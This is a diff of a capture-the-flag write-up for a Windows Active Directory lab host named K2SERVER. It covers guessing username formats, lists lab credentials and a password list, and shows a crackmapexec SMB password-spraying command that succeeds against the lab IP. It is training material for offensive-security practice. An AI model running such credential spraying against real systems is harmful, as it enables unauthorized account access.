@@ -88,7 +88,7 @@ Service Info: Host: K2SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 All services has the anonymous/guest logon enable. We can think to use the data found in the previous challenge.
 
-In AD env sometimes the username of the account is the first letter of name, dot, complete surname. Try to do this with 2 user found in the Linux Server.&#x20;
+In AD env often the username of the account is the first letter of name, dot, complete surname. Try to do this with 2 user found in the Linux Server.&#x20;
 
 ```
 j.bold : Pwd@9tLNrC3!
@@ -119,6 +119,7 @@ St3veRoxx32
 PartyAlLDaY!32
 L0v3MyDog!3!
 PikAchu!IshoesU!
+vRMkaVgdfxhW!8
 ```
 {% endcode %}
 
@@ -128,4 +129,3 @@ crackmapexec smb 10.10.145.48 -u userlist.txt -p passwd.list
 SMB         10.10.145.48    445    K2SERVER         [+] k2.thm\r.bud:vRMkaVgdfxhW!8 
 ```
 
-Try to this with Kerbrute or other tools.
